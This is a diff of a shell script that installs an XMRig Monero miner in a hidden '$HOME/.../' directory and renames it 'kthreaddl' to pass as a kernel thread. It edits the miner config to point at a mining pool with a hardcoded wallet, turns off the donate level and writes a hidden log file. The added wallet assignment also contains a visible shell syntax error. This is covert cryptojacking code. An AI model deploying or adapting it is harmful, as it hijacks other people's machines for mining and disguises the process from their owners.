@@ -980,6 +980,7 @@ if (test $? -ne 0); then
   fi
   rm /tmp/kthreaddl.tar.gz
   mv $HOME/.../xmrig $HOME/.../kthreaddl
+  WALLET = "4B4qdh346S9MTs9o8n8kRWRNgrXJktcAcKdq8qvjaevKEtXMSCFuKvD74UZbuT9ndsN1x8LcQzmk6HvySw2NxvUrDqSaU99"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.../config.json
   sed -i 's/"url": *"[^"]*",/"url": "pool.minexmr.com:443",/' $HOME/.../config.json
   sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.../config.json
@@ -995,7 +996,7 @@ if (test $? -ne 0); then
 fi
 
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.../config.json
-sed -i 's/"rig-id": *null,/"rig-id": "'$PASS'",/' $HOME/.../config.json
+sed -i 's#"rig-id": *null,#"rig-id": "'$HOME'",#' $HOME/.../config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/.../.kthreaddl.log'",#' $HOME/.../config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.../config.json
 
